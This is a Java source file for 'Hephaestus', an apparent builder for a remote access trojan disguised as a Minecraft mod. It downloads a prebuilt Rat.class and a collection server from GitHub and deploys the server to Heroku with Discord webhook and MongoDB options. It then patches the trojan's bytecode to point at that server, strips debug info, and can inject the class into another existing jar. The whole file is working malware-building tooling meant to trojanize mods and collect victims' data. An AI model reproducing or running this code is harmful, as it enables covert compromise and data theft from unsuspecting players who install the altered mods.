package studio.dreamys;

import com.heroku.api.App;
import com.heroku.api.HerokuAPI;
import jdk.internal.org.objectweb.asm.ClassReader;
import jdk.internal.org.objectweb.asm.ClassVisitor;
import jdk.internal.org.objectweb.asm.ClassWriter;
import jdk.internal.org.objectweb.asm.Opcodes;
import jdk.internal.org.objectweb.asm.commons.Remapper;
import jdk.internal.org.objectweb.asm.commons.RemappingClassAdapter;
import jdk.internal.org.objectweb.asm.tree.AbstractInsnNode;
import jdk.internal.org.objectweb.asm.tree.ClassNode;
import jdk.internal.org.objectweb.asm.tree.LdcInsnNode;
import jdk.internal.org.objectweb.asm.tree.MethodNode;
import net.lingala.zip4j.ZipFile;
import org.apache.commons.io.FileUtils;
import org.apache.commons.io.IOUtils;
import org.eclipse.jgit.api.Git;
import org.eclipse.jgit.lib.StoredConfig;
import org.eclipse.jgit.transport.UsernamePasswordCredentialsProvider;

import java.awt.*;
import java.io.File;
import java.io.InputStream;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Collections;
import java.util.Enumeration;
import java.util.Scanner;
import java.util.jar.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.zip.ZipEntry;

public class Tasks {
    //paths
    public static File path = new File(System.getenv("APPDATA") + "\\Hephaestus");
    public static File jdkPath = new File(path + "\\jdk");
    public static File ratClass = new File(path + "\\rat\\Rat.class");
    public static File serverPath = new File(path + "\\server");
    public static File serverClass = new File(serverPath + "\\app.js");

    //api
    public static HerokuAPI herokuAPI;
    public static Git git;

    //global vars
    public static String apiKey;
    public static boolean reusing;
    public static String appName;

    //input
    public static Scanner sc = new Scanner(System.in);

    public static void fullSetup() {
        //setup
        separator();
        setupJavaJDK();

        separator();
        getHerokuAPIKey();

        separator();
        downloadServerDirectory();

        separator();
        downloadRatClass();
        //server
        separator();
        initializeGitRepo();

        separator();
        createHerokuApp();

        separator();
        changeConfigVars();

        separator();
        deployHerokuApp();
        //client
        separator();
        buildMod();
        separator(); //last separator
    }

    public static void modOnly() {
        separator();
        getHerokuAPIKey();
        separator();
        log("Please choose a heroku app to build mod to: ");
        herokuAPI.listApps().forEach(app -> System.out.println(app.getName()));
        appName = sc.nextLine();
        while (!herokuAPI.appExists(appName)) {
            log("App does not exist. Please retry: ");
            appName = sc.nextLine();
        }
        separator();
        downloadRatClass();
        separator();
        buildMod();
        separator();
    }

    /* Setup */

    public static void setupJavaJDK() {
        try {
            warn("Checking Java JDK...");
            
            if (System.getProperty("java.vm.name").equals("Java HotSpot(TM) 64-Bit Server VM") && System.getProperty("java.specification.version").equals("1.8")) {
                ok("Found suitable JDK (Official 64-bit 1.8)");
                log("Skipping download.");
                return;
            }
            
            if (jdkPath.exists()) {
                log("Java JDK already downloaded.");
                log("Skipping download.");
                return;
            }

            warn("No suitable JDK found.");
            log("Downloading Java JDK...");

            FileUtils.copyURLToFile(new URI("https://www.dl.dropboxusercontent.com/s/prflwoma5r16yxy/jdk1.8.0_341.zip").toURL(), new File(jdkPath + "\\jdk.zip"));

            log("Downloaded Java JDK.");
        } catch (Exception e) {
            error("Something went wrong while downloading Java JDK.");
            e.printStackTrace();
            exit();
        }

        try {
            log("Unzipping Java JDK...");

            //noinspection resource
            ZipFile zipFile = new ZipFile(jdkPath + "\\jdk.zip");
            zipFile.extractAll(String.valueOf(jdkPath));

            ok("Unzipped Java JDK.");
            File file = new File("Hephaestus.bat");
            FileUtils.writeStringToFile(file, jdkPath + "\\bin\\java.exe -jar " + new File(Tasks.class.getProtectionDomain().getCodeSource().getLocation().getPath()).getName() + " & pause", StandardCharsets.UTF_8);
            warn("Relaunch this program with the Hephaestus.bat file.");
            exit();
        } catch (Exception e) {
            error("Something went wrong while unzipping Java JDK.");
            e.printStackTrace();
            exit();
        }
    }

    public static void setHerokuAPIKey() {
        try {
            log("Enter your Heroku API key: ");
            String key = sc.nextLine();
            herokuAPI = new HerokuAPI(key);
            herokuAPI.getUserInfo(); //verification
            FileUtils.writeStringToFile(new File(path + "\\herokuapikey.hephaestus"), key, StandardCharsets.UTF_8);
            apiKey = key;
            ok("Heroku API key set.");
        } catch (Exception e) {
            error("Something went wrong while setting Heroku API key.");
            e.printStackTrace();
            log("Try setting it again.");
            setHerokuAPIKey();
        }
    }

    public static void getHerokuAPIKey() {
        try {
            if (new File(path + "\\herokuapikey.hephaestus").createNewFile()) {
                setHerokuAPIKey();
                return;
            }
            log("Checking Heroku API key...");
            String key = FileUtils.readFileToString(new File(path + "\\herokuapikey.hephaestus"), StandardCharsets.UTF_8);
            herokuAPI = new HerokuAPI(key);
            herokuAPI.getUserInfo(); //verification
            apiKey = key;
            ok("Valid Heroku API key found.");
        } catch (Exception e) {
            error("Something went wrong while getting Heroku API key.");
            e.printStackTrace();
            log("Try setting it again.");
            setHerokuAPIKey();
        }
    }

    public static void downloadServerDirectory() {
        try {
            log("Downloading server from upstream...");

            FileUtils.copyURLToFile(new URI("https://raw.githubusercontent.com/DxxxxY/R.A.T/master/server/models/Ratted.js").toURL(), new File(serverPath + "\\models\\Ratted.js"));
            FileUtils.copyURLToFile(new URI("https://raw.githubusercontent.com/DxxxxY/R.A.T/master/server/.gitignore").toURL(), new File(serverPath + "\\.gitignore"));
            FileUtils.copyURLToFile(new URI("https://raw.githubusercontent.com/DxxxxY/R.A.T/master/server/Procfile").toURL(), new File(serverPath + "\\Procfile"));
            FileUtils.copyURLToFile(new URI("https://raw.githubusercontent.com/DxxxxY/R.A.T/master/server/app.js").toURL(), new File(serverPath + "\\app.js"));
            FileUtils.copyURLToFile(new URI("https://raw.githubusercontent.com/DxxxxY/R.A.T/master/server/package-lock.json").toURL(), new File(serverPath + "\\package-lock.json"));
            FileUtils.copyURLToFile(new URI("https://raw.githubusercontent.com/DxxxxY/R.A.T/master/server/package.json").toURL(), new File(serverPath + "\\package.json"));

            ok("Downloaded server from upstream.");
        } catch (Exception e) {
            error("Something went wrong while downloading server.");
            e.printStackTrace();
            exit();
        }
    }

    public static void downloadRatClass() {
        try {
            log("Downloading R.A.T class from upstream...");

            FileUtils.copyURLToFile(new URI("https://raw.githubusercontent.com/DxxxxY/R.A.T/master/Rat.class").toURL(), ratClass);

            ok("Downloaded R.A.T class from upstream.");
        } catch (Exception e) {
            error("Something went wrong while downloading R.A.T class.");
            e.printStackTrace();
            exit();
        }
    }

    /* Server */

    public static void initializeGitRepo() {
        try {
            log("Initializing server git repository...");

            Git.init().setDirectory(serverPath).call();
            git = Git.open(serverPath);

            //check for already existing git repo remote
            //noinspection RegExpRedundantEscape
            Matcher m = Pattern.compile("https:\\/\\/git\\.heroku\\.com\\/(.*).git").matcher(nullable(git.getRepository().getConfig().getString("remote", "heroku", "url")));
            if (m.find()) {
                appName = m.group(1);
                log("Found old git heroku remote: " + m.group(1));
                log("Do you want to delete it and create a new app? [y/n]");
                String answer = sc.nextLine();
                if (answer.equals("y")) {
                    log("Deleting old git remote...");
                    StoredConfig config = git.getRepository().getConfig();
                    config.unsetSection("remote", "heroku");
                    config.save();
                    ok("Deleted old git remote.");
                } else {
                    log("Reusing old git remote.");
                    warn("This will skip multiple tasks of creating from scratch.");
                    reusing = true;
                }
            }

            ok("Initialized server git repository.");
        } catch (Exception e) {
            error("Something went wrong while initializing server git repository.");
            e.printStackTrace();
            exit();
        }
    }

    public static void createHerokuApp() {
        try {
            if (reusing) { //we can skip this step if we are reusing an existing git remote
                ok("Skipped createHerokuApp task.");
                return;
            }

            log("Please enter the desired name for the app:");

            appName = sc.nextLine();
            while (!herokuAPI.isAppNameAvailable(appName)) {
                log("App name already taken. Please enter another one:");
                appName = sc.nextLine();
            }

            log("Creating heroku app...");

            herokuAPI.createApp(new App().named(appName));

            ok("Created heroku app.");
        } catch (Exception e) {
            error("Something went wrong while creating heroku app.");
            e.printStackTrace();
            exit();
        }
    }

    public static void changeConfigVars() {
        try {
            if (reusing) { //we still need to change config vars because it gets updated from upstream
                log("Synchronizing config vars...");
                herokuAPI.listConfig(appName).forEach((key, value) -> {
                    if (key.equals("WEBHOOK") && value.equals("")) {
                        replaceInFile(serverClass, "usingDiscord = true", "usingDiscord = false");
                        log("Disabled Discord mode in server.");
                    }

                    if (key.equals("DB") && value.equals("")) {
                        replaceInFile(serverClass, "usingMongoDB = true", "usingMongoDB = false");
                        log("Disabled MongoDB mode in server.");
                    }
                });
                ok("Config vars synchronized.");
                return;
            }

            log("Please enter the discord WEBHOOK url: (leave it empty if you're not using it)");
            String webhookUrl = sc.nextLine();
            if (webhookUrl.equals("")) {
                replaceInFile(serverClass, "usingDiscord = true", "usingDiscord = false");
            }

            log("Please enter the database DB url: (leave it empty if you're not using it)");
            String dbUrl = sc.nextLine();
            if (dbUrl.equals("")) {
                replaceInFile(serverClass, "usingMongoDB = true", "usingMongoDB = false");
            }

            log("Changing config vars...");

            herokuAPI.updateConfig(appName, Collections.singletonMap("WEBHOOK", webhookUrl));
            herokuAPI.updateConfig(appName, Collections.singletonMap("DB", dbUrl));

            ok("Changed config vars.");
        } catch (Exception e) {
            error("Something went wrong while changing config vars.");
            e.printStackTrace();
            exit();
        }
    }

    public static void deployHerokuApp() {
        try {
            log("Deploying heroku app...");

            StoredConfig config = git.getRepository().getConfig();
            config.setString("remote", "heroku", "url", "https://git.heroku.com/" + appName + ".git");
            config.setString("remote", "heroku", "fetch", "+refs/heads/*:refs/remotes/heroku/*");
            config.save();

            Git.open(serverPath).add().addFilepattern(".").call();
            Git.open(serverPath).commit().setMessage("Hephaestus Autocommit").call();
            Git.open(serverPath).push().setCredentialsProvider(new UsernamePasswordCredentialsProvider("", apiKey)).setRemote("heroku").call();

            ok("Heroku app deployed.");
        } catch (Exception e) {
            error("Something went wrong while deploying heroku app.");
            e.printStackTrace();
            exit();
        }
    }

    /* Client */

    public static void buildMod() {
        try {
            log("Changing server URL...");

            //open class
            InputStream is = Files.newInputStream(ratClass.toPath());
            byte[] bytes = IOUtils.toByteArray(is);
            ClassNode cn = getNode(bytes);

            //find ldc instruction of the url and replace it with our own
            for (MethodNode mn : cn.methods) {
                for (AbstractInsnNode ain : mn.instructions.toArray()){
                    if (ain.getOpcode() == Opcodes.LDC) {
                        LdcInsnNode ldc = (LdcInsnNode) ain;
                        if (ldc.cst instanceof String) {
                            if (ldc.cst.toString().equals("http://localhost:80/")) {
                                ldc.cst = "https://" + appName + ".herokuapp.com/";
                            }
                        }
                    }
                }
            }

            ok("Changed server URL.");

            log("Changing modid...");

            log("Choose a modid for the mod: ");

            //find and replace modid key in @Mod annotation
            cn.visibleAnnotations.get(0).values.set(1, sc.nextLine());

            ok("Changed modid.");

            log("Removing source...");

            //remove source
            cn.sourceFile = null;
            cn.sourceDebug = null;

            ok("Removed source.");

            log("Saving as jar...");

            log("Do you wish to insert this class into another jar? [y/n]");
            String answer = sc.nextLine();
            if (answer.equals("y")) {
                log("Please enter the full path of the jar: ");

                File jar = new File(sc.nextLine());
                while (!jar.exists()) {
                    error("File does not exist.");
                }

                //change package and name of class
                log("Please enter the full name of the class: (eg: studio.dreamys.Rat)");
                String className = sc.nextLine();
                className = className.replace(".", "/");

                String finalClassName = className;
                ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
                ClassVisitor cv = new RemappingClassAdapter(cw, new Remapper() {
                    @Override
                    public String map(String from) {
                        if (from.equals("studio/dreamys/Rat")) {
                            return finalClassName;
                        }
                        return from;
                    }
                });

                //write changes
                cn.accept(cv);
                saveAsJar(cw.toByteArray(), jar, className);
            } else {
                //compile class to jar
                ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
                cn.accept(cw);
                saveAsJar(cw.toByteArray(), path + "\\R.A.T.jar");
            }

            ok("Saved as jar.");
        } catch (Exception e) {
            error("Something went wrong while building the mod.");
            e.printStackTrace();
            exit();
        }
    }

    /* Utils */

    public static ClassNode getNode(byte[] bytes) {
        ClassNode cn = new ClassNode();

        try {
            ClassReader cr = new ClassReader(bytes);
            cr.accept(cn, ClassReader.EXPAND_FRAMES);
        } catch (Exception e) {
            e.printStackTrace();
        }

        return cn;
    }

    public static void saveAsJar(byte[] outBytes, String fileName) {
        try {
            //create manifest
            Manifest mf = new Manifest();
            mf.getMainAttributes().put(Attributes.Name.MANIFEST_VERSION, "1.0");

            //open new jar output stream
            JarOutputStream out = new JarOutputStream(Files.newOutputStream(Paths.get(fileName)), mf);

            //write bytes to class
            out.putNextEntry(new ZipEntry("studio/dreamys/Rat.class"));
            out.write(outBytes);
            out.close();

            //open built jar folder
            Desktop.getDesktop().open(path);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void saveAsJar(byte[] outBytes, File jar, String className) {
        try {
            //buffers
            byte[] buffer = new byte[1024];
            int bytesRead;

            //open existing jar file
            JarFile jarFile = new JarFile(jar);

            //open new jar output stream
            JarOutputStream out = new JarOutputStream(Files.newOutputStream(Paths.get(path + "\\" + jar.getName())));

            //rewrite everything from the jar file into our own
            for (Enumeration<JarEntry> e = jarFile.entries(); e.hasMoreElements(); ) {
                JarEntry entry = e.nextElement();
                InputStream entryStream = jarFile.getInputStream(entry);
                out.putNextEntry(entry);

                while ((bytesRead = entryStream.read(buffer)) != -1) {
                    out.write(buffer, 0, bytesRead);
                }
            }

            //write our own class to the jar
            out.putNextEntry(new JarEntry(className + ".class"));
            out.write(outBytes);
            out.close();

            //open built jar folder
            Desktop.getDesktop().open(path);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void replaceInFile(File file, String find, String replace) {
        try {
            String content = new String(Files.readAllBytes(file.toPath()), StandardCharsets.UTF_8);
            content = content.replaceAll(find, replace);
            Files.write(file.toPath(), content.getBytes(StandardCharsets.UTF_8));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /* Shortcut utils */

    public static void log(String message) {
        System.out.println("[Hephaestus] " + message);
    }

    public static void warn(String message) {
        System.out.println("[Hephaestus] [WARNING] " + message);
    }

    public static void ok(String message) {
        System.out.println("[Hephaestus] [OK] " + message);
    }

    public static void error(String message) {
        System.out.println("[Hephaestus] [ERROR] " + message);
    }

    public static void separator() {
        System.out.println("--------------------------------------------------------------------------------------------------------------------");
    }

    public static void exit() {
        System.exit(-1);
    }

    public static String nullable(String string) {
        if (string == null) {
            return "";
        }
        return string;
    }
}
